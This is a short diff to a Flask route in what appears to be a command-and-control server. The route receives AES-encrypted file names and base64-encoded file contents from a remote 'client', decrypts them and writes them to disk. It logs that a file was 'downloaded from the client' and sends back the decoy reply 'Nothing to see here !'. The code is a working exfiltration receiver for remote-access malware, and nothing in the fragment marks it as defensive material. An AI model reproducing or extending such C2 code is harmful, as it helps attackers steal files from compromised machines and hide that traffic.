@@ -194,10 +194,12 @@ def index():
 def fr():
     filename = decrypt_command(aes_encryption_key, request.form["fn"].replace(" ","+"))
     f = open(filename.strip("\x00"), "wb")
+    #fdata = request.form["token"].replace(" ", "+").encode().
     fdata = request.form["token"].replace(" ", "+")
-    #raw_base64 = decrypt_command(aes_encryption_key, fdata)
-    ready_to_write = base64.b64decode(fdata.decode("UTF-16LE"))
-    f.write(ready_to_write)
+    raw_base64 = decrypt_command(aes_encryption_key, fdata)
+    #ready_to_write = base64.b64decode(fdata.decode("UTF-16LE"))
+    f.write(base64.b64decode(raw_base64.encode()))
+    #f.write(base64.b64decode(raw_base64.decode("UTF-16LE")))
     f.close()
     print(colored("\n[+] File %s downloaded from the client !" % filename, "green"))
     response = make_response("Nothing to see here !")
